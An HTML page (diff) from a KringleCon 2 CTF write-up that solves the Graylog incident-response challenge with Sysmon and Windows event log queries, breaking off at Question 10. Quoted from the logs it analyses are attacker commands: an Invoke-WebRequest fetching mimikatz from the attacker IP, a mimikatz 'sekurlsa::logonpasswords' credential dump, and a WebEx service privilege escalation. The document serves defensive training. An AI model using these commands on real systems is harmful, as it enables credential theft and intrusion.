@@ -1,0 +1,1195 @@
+
+
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="Kringlecon2 CTF Writeup">
+      
+      
+      
+        <meta name="author" content="Salaheldinaz">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../favicon.ico">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+    
+    
+      
+        <title>Graylog - The Turtle Dove</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#e91e63">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,400i,700%7CUbuntu+Mono&display=fallback">
+        <style>body,input{font-family:"Ubuntu","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Ubuntu Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/asciinema-player.css">
+    
+    
+      
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="pink" data-md-color-accent="grey">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#graylog" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="The Turtle Dove" class="md-header-nav__button md-logo">
+          
+            <img src="../../images/logo.png" width="24" height="24">
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            <span class="md-header-nav__topic">
+              The Turtle Dove
+            </span>
+            <span class="md-header-nav__topic">
+              
+                Graylog
+              
+            </span>
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+          
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main" role="main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="The Turtle Dove" class="md-nav__button md-logo">
+      
+        <img src="../../images/logo.png" width="48" height="48">
+      
+    </a>
+    The Turtle Dove
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      Objectives
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Objectives
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective0/" title="0 Talk to Santa in the Quad" class="md-nav__link">
+      0 Talk to Santa in the Quad
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective1/" title="1 Find the Turtle Doves" class="md-nav__link">
+      1 Find the Turtle Doves
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective2/" title="2 Unredact Threatening Document" class="md-nav__link">
+      2 Unredact Threatening Document
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective3/" title="3 Windows Log Analysis - Evaluate Attack Outcome" class="md-nav__link">
+      3 Windows Log Analysis - Evaluate Attack Outcome
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective4/" title="4 Windows Log Analysis - Determine Attacker Technique" class="md-nav__link">
+      4 Windows Log Analysis - Determine Attacker Technique
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective5/" title="5 Windows Log Analysis - Determine Compromised System" class="md-nav__link">
+      5 Windows Log Analysis - Determine Compromised System
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective6/" title="6 Splnuk" class="md-nav__link">
+      6 Splnuk
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective7/" title="7 Get Access To The Steam Tunnels" class="md-nav__link">
+      7 Get Access To The Steam Tunnels
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective8/" title="8 Bypassing the Frido Sleigh CAPTEHA" class="md-nav__link">
+      8 Bypassing the Frido Sleigh CAPTEHA
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective9/" title="9 Retrieve Scraps of Paper from Server" class="md-nav__link">
+      9 Retrieve Scraps of Paper from Server
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective10/" title="10 Recover Cleartext Document" class="md-nav__link">
+      10  Recover Cleartext Document
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective11/" title="11 Open the Sleigh Shop Door" class="md-nav__link">
+      11  Open the Sleigh Shop Door
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../objectives/objective12/" title="12 Filter Out Poisoned Sources of Weather Data" class="md-nav__link">
+      12  Filter Out Poisoned Sources of Weather Data
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+    
+    <label class="md-nav__link" for="nav-3">
+      Helping the elves
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Helping the elves
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge1/" title="Escape Ed" class="md-nav__link">
+      Escape Ed
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge2/" title="Linux Path" class="md-nav__link">
+      Linux Path
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge3/" title="Xmas laser cheers" class="md-nav__link">
+      Xmas laser cheers
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge4/" title="Splunk - The training questions" class="md-nav__link">
+      Splunk - The training questions
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge5/" title="Mongo Pilfer" class="md-nav__link">
+      Mongo Pilfer
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge6/" title="Nyanshell" class="md-nav__link">
+      Nyanshell
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge7/" title="Frosty Keypad" class="md-nav__link">
+      Frosty Keypad
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge8/" title="Holiday Hack trail" class="md-nav__link">
+      Holiday Hack trail
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge9/" title="Key Bitting" class="md-nav__link">
+      Key Bitting
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Graylog
+      </label>
+    
+    <a href="./" title="Graylog" class="md-nav__link md-nav__link--active">
+      Graylog
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#graylog" class="md-nav__link">
+    🎮 Graylog
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    ⚡️ Solution
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#question-1" class="md-nav__link">
+    Question 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-2" class="md-nav__link">
+    Question 2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-3" class="md-nav__link">
+    Question 3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-4" class="md-nav__link">
+    Question 4
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-5" class="md-nav__link">
+    Question 5
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-6" class="md-nav__link">
+    Question 6
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-7" class="md-nav__link">
+    Question 7
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-8" class="md-nav__link">
+    Question 8:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-9" class="md-nav__link">
+    Question 9
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-10" class="md-nav__link">
+    Question 10
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-youve-learned" class="md-nav__link">
+    🎓 What you've learned
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge11/" title="Smart Braces" class="md-nav__link">
+      Smart Braces
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../challenge12/" title="Zeek JSON Analysis" class="md-nav__link">
+      Zeek JSON Analysis
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../terminals/" title="Terminals & Portals" class="md-nav__link">
+      Terminals & Portals
+    </a>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#graylog" class="md-nav__link">
+    🎮 Graylog
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    ⚡️ Solution
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#question-1" class="md-nav__link">
+    Question 1
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-2" class="md-nav__link">
+    Question 2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-3" class="md-nav__link">
+    Question 3
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-4" class="md-nav__link">
+    Question 4
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-5" class="md-nav__link">
+    Question 5
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-6" class="md-nav__link">
+    Question 6
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-7" class="md-nav__link">
+    Question 7
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-8" class="md-nav__link">
+    Question 8:
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-9" class="md-nav__link">
+    Question 9
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#question-10" class="md-nav__link">
+    Question 10
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-youve-learned" class="md-nav__link">
+    🎓 What you've learned
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>Graylog</h1>
+                
+                <h2 id="graylog"><strong>🎮 Graylog</strong><a class="headerlink" href="#graylog" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>📍 The dorm</p>
+</blockquote>
+<p><img alt="chl10-1" src="../images/chl10/1.png" /></p>
+<div class="admonition quote">
+<p class="admonition-title">🧝🏻‍♂️ Pepper Minstix</p>
+<p>It's me - Pepper Minstix.</p>
+<p>Normally I'm jollier, but this Graylog has me a bit mystified.</p>
+<p>Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala.</p>
+<p>Some Elf U computers were hacked, and I've been tasked with performing incident response.</p>
+<p>Can you help me fill out the incident response report using our instance of Graylog?</p>
+<p>It's probably helpful if you know a few things about Graylog.</p>
+<p>Event IDs and Sysmon are important too. Have you spent time with those?</p>
+<p>Don't worry - I'm sure you can figure this all out for me!</p>
+<p>Click on the All messages Link to access the Graylog search interface!</p>
+<p>Make sure you are searching in all messages!</p>
+<p>The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner.</p>
+<p>Login with the username <code>elfustudent</code> and password <code>elfustudent</code>.</p>
+</div>
+<div class="admonition hint">
+<p class="admonition-title">Graylog</p>
+<p><a href="http://docs.graylog.org/en/3.1/pages/queries.html">Graylog Docs</a></p>
+</div>
+<div class="admonition hint">
+<p class="admonition-title">Event IDs and Sysmon</p>
+<p>(Events and Sysmon)</p>
+</div>
+<div class="admonition info">
+<p class="admonition-title">Complete Incident Response Report questions </p>
+</div>
+<hr />
+<h3 id="solution">⚡️ Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h3>
+<ol>
+<li>
+<p>Login to graylog server with the username <code>elfustudent</code> and password <code>elfustudent</code>.</p>
+<p><img alt="chl10-2" src="../images/chl10/2.jpg" /></p>
+<p><img alt="chl10-3" src="../images/chl10/3.png" /></p>
+</li>
+<li>
+<p>Check ElfU Graylog Incident Response Report from right-bottom corner or from this <a href="https://report.elfu.org/">Link</a></p>
+<p><img alt="chl10-6" src="../images/chl10/6.png" /></p>
+</li>
+<li>
+<p>Select <code>All messages</code> stream to search and make sure to select <code>search in all message</code> at upper-left corner:</p>
+<p><img alt="chl10-4" src="../images/chl10/4.png" /></p>
+</li>
+</ol>
+<hr />
+<p><img alt="chl10-5" src="../images/chl10/5.png" /></p>
+<h4 id="question-1">Question 1<a class="headerlink" href="#question-1" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">What is the full-path + filename of the first malicious file downloaded by Minty?</p>
+<p>Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.</p>
+</div>
+<p>We can find this searching for sysmon file creation <code>event id 2</code> with a process named <code>firefox.exe</code> and not junk <code>.temp</code> files. and use regular expressions to include or exclude patterns.</p>
+<p>Search query:
+<div class="codehilite"><pre><span></span>minty AND EventID:2 AND ProcessImage:/.*firefox.*/ NOT TargetFilename:/.*\.temp/
+</pre></div></p>
+<blockquote>
+<p><code>minty</code> the name of the user account.<br>
+<code>EventID:2</code> A process changed a file creation time. The change file creation time event is registered when a file creation time is explicitly modified by a process.<sup id="fnref:19"><a class="footnote-ref" href="#fn:19">1</a></sup><br>
+<code>AND ProcessImage:/.*firefox.*/</code> Check for events for Firefox app .<br>
+<code>NOT TargetFilename:/.*\.temp/</code> Exclude temp folder from search.<br></p>
+</blockquote>
+<p><img alt="chl10-7" src="../images/chl10/7.png" /></p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p><code>C:\Users\minty\Downloads\cookie_recipe.exe</code></p>
+</div>
+<hr />
+<h4 id="question-2">Question 2<a class="headerlink" href="#question-2" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">What was the ip:port the malicious file connected to first?</p>
+<p>The malicious file downloaded and executed by Minty gave the attacker remote access to his machine.</p>
+</div>
+<p>We can pivot off the answer to our first question using the binary path as our ProcessImage.</p>
+<p>Search query:
+<div class="codehilite"><pre><span></span>EventID:3 AND ProcessImage:/.*cookie_recipe.exe/
+</pre></div></p>
+<blockquote>
+<p><code>EventID:3</code> Network connection.<br>The network connection event logs TCP/UDP connections on the machine. Each connection is linked to a process through the ProcessId and ProcessGUID fields. The event also contains the source and destination host names IP addresses, port numbers and IPv6 status.<br>
+<code>ProcessImage:/.*cookie_recipe.exe/</code> Check for events by the process <code>cookie_recipe.exe</code> .</p>
+</blockquote>
+<p><img alt="chl10-8" src="../images/chl10/8.png" /></p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p><code>192.168.247.175:4444</code></p>
+</div>
+<hr />
+<h4 id="question-3">Question 3<a class="headerlink" href="#question-3" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">What was the first command executed by the attacker?</p>
+<p>(answer is a single word)</p>
+</div>
+<p>Since all commands <code>sysmon event id 1</code> by the attacker are initially running through the <code>cookie_recipe.exe</code> binary, we can set its full-path as our <code>ParentProcessImage</code> to find child processes it creates sorting on <code>timestamp</code>.</p>
+<p>Search query
+<div class="codehilite"><pre><span></span>ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe
+</pre></div></p>
+<p><img alt="chl10-15" src="../images/chl10/15.png" /></p>
+<p>OR We can follow the previous question result and use <code>timestamp</code> to search surrounding events for example 30 seconds and also include <code>Commandline</code></p>
+<ol>
+<li>
+<p>Select <code>Show surrounding messages</code> &gt; <code>30 seconds</code></p>
+<p><img alt="chl10-9" src="../images/chl10/9.png" /></p>
+</li>
+<li>
+<p>Add <code>ParentProcessImage:/.*cookie_recipe.exe/</code> to check for events where the parent process is <code>cookie_recipe.exe</code>.</p>
+</li>
+<li>
+<p>Add <code>_exists_:CommandLine</code> to lookup for events with CommandLine.</p>
+<p><img alt="chl10-10" src="../images/chl10/12.png" /></p>
+</li>
+<li>
+<p>Select <code>CommandLine</code> and <code>ParentProcessImage</code> from left panel to show them</p>
+<p><img alt="chl10-10" src="../images/chl10/10.png" /></p>
+</li>
+</ol>
+<p>Search query:
+<div class="codehilite"><pre><span></span>source:&quot;elfu\-res\-wks1&quot; AND gl2_source_input:&quot;5defd222adbe1d0012fab8ca&quot;AND ParentProcessImage:/.*cookie_recipe.exe/ AND _exists_:CommandLine
+</pre></div></p>
+<p>Sort result by timestamp to see the result in time order:
+<img alt="chl10-13" src="../images/chl10/13.png" /></p>
+<p><img alt="chl10-11" src="../images/chl10/11.png" /></p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p><code>whoami</code></p>
+</div>
+<hr />
+<h4 id="question-4">Question 4<a class="headerlink" href="#question-4" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">What is the one-word service name the attacker used to escalate privileges?</p>
+</div>
+<p>Continuing on using the <code>cookie_reciper.exe</code> binary as our <code>ParentProcessImage</code>, we should see some more commands later on related to a service in the previous question result if you follow the events in time order:</p>
+<p><img alt="chl10-16" src="../images/chl10/16.png" /></p>
+<p>What initially got our attention is that <code>webexservice</code> launched by the malicious executable that even though this service is designed to update <code>WebEx</code>, it could also be used to launch other programs.</p>
+<p><img alt="chl10-14" src="../images/chl10/14.png" /></p>
+<div class="codehilite"><pre><span></span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;sc start webexservice a software-update 1 wmic process call create &quot;</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">minty</span><span class="p">\</span><span class="n">Downloads</span><span class="p">\</span><span class="n">cookie_recipe2</span><span class="p">.</span><span class="n">exe</span><span class="s2">&quot; &quot;</span>
+</pre></div>
+
+<p>As the service is running under the System account, any executable launched by it would be launched with the same permissions. The <code>WebexService</code> service does not automatically start when Windows starts. Instead, it is called as necessary to perform an update of WebEx, or in this case, other programs. It's known Unusual Remote Execution Bug in Cisco WebEx Discovered by Researchers.</p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p><code>webexservice</code></p>
+</div>
+<hr />
+<h4 id="question-5">Question 5<a class="headerlink" href="#question-5" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">What is the file-path + filename of the binary ran by the attacker to dump credentials?</p>
+</div>
+<p>As we read the events in timestamp order, next we see attacker downloaded <code>cookie_recipe2.exe</code>  using <code>Invoke-WebRequest</code> cmdlet then the attacker elevates privileges using the vulnerable <code>webexservice</code> to run a file called <code>cookie_recipe2.exe</code>. Let's use this binary path in our <code>ParentProcessImage</code> search.</p>
+<p><div class="codehilite"><pre><span></span>ParentProcessImage:/.*cookie_recipe2.exe/
+</pre></div>
+<img alt="chl10-17" src="../images/chl10/17.png" /></p>
+<p>We notice that the attacker downloaded <code>Mimikatz</code> tool which known for exploit security flaws and gather credentials. And he renamed it to <code>cookie.exe</code> and saved at <code>C:\cookie.exe</code>
+<div class="codehilite"><pre><span></span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe &quot;</span>
+</pre></div></p>
+<p>Then run <code>sekurlsa::logonpasswords</code> command to dump credentials which known for <code>mimikatz</code> tool to output all of passwords stored on the machine
+<div class="codehilite"><pre><span></span><span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;C:\cookie.exe &quot;</span><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span><span class="s2">&quot; &quot;</span><span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span><span class="s2">&quot; exit &quot;</span>
+</pre></div></p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p><code>C:\cookie.exe</code></p>
+</div>
+<hr />
+<h4 id="question-6">Question 6<a class="headerlink" href="#question-6" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">Which account name was used to pivot to another machine?</p>
+<p>The attacker pivoted to another workstation using credentials gained from Minty's computer.</p>
+</div>
+<p>Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress.</p>
+<p>Search query:
+<div class="codehilite"><pre><span></span>SourceNetworkAddress:192.168.247.175 AND EventID:4624
+</pre></div></p>
+<p><img alt="chl10-18" src="../images/chl10/18.png" /></p>
+<div class="admonition hint">
+<p class="admonition-title">Use left panel to show different Fields from the events</p>
+</div>
+<p>Directly we know which account was used.</p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p>alabaster</p>
+</div>
+<hr />
+<h4 id="question-7">Question 7<a class="headerlink" href="#question-7" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?</p>
+</div>
+<p>Search using <code>LogonType 10</code> which mean RemoteInteractive when you access a computer through Terminal Services, Remote Desktop or Remote Assistance.</p>
+<p>Search query:
+<div class="codehilite"><pre><span></span>SourceNetworkAddress:192.168.247.175 AND LogonType:10
+</pre></div></p>
+<p><img alt="chl10-19" src="../images/chl10/19.png" /></p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p><code>06:04:28</code></p>
+</div>
+<hr />
+<h4 id="question-8">Question 8:<a class="headerlink" href="#question-8" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">What is the SourceHostName, DestinationHostname, LogonType of the following connection?"</p>
+<p>The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host.
+(submit in that order as csv)</p>
+</div>
+<p>The attacker has GUI access to the host <code>elfu-res-wks2</code> via RDP. They likely use this GUI connection to access the file system of third host using <code>explorer.exe</code> via UNC file paths (which is why we don't see any <code>cmd.exe</code> or <code>powershell.exe</code> process creates). <br>
+However, we still see the successful network authentication for this with <code>event id 4624</code> and <code>logon type 3</code>.</p>
+<p>Using <code>LogonType 3</code> which in most cases when you access a computer from elsewhere on the network.  over-the-network logons are classed as logon type 3. and <code>Event ID 4624</code> an account was successfully logged on. Search query:
+<div class="codehilite"><pre><span></span>SourceHostName:ELFU\-RES\-WKS2 AND LogonType:3 AND EventID:4624
+</pre></div></p>
+<p><img alt="chl10-20" src="../images/chl10/20.png" /></p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p><code>elfu-res-wks2,elfu-res-wks3,3</code></p>
+</div>
+<hr />
+<h4 id="question-9">Question 9<a class="headerlink" href="#question-9" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">What is the <code>full-path</code> + <code>filename</code> of the secret research document after being transferred from the third host to the second host?</p>
+</div>
+<p>We can look for <code>EventID:2</code> sysmon file creation event , and set the source machine <code>elfu-res-wks2</code> , also use regex to filter out overly common file paths using something like:</p>
+<div class="codehilite"><pre><span></span>EventID:2 AND NOT TargetFilename:/.+AppData.+/ AND NOT TargetFilename:/.+ProgramData.+/ AND source:elfu\-res\-wks2
+</pre></div>
+
+<p><img alt="chl10-21" src="../images/chl10/21.png" /></p>
+<div class="admonition done">
+<p class="admonition-title">The answer</p>
+<p><code>C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf</code></p>
+</div>
+<hr />
+<h4 id="question-10">Question 10<a class="headerlink" href="#question-10" title="Permanent link">&para;</a></h4>
+<div class="admonition question">
+<p class="admonition-title">What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?</p>
+</div>
+<p>We can look for the original document in CommandLine using regex with the document name <code>super_secret_elfu_research.pdf</code>.</p>
+<p>Search query:
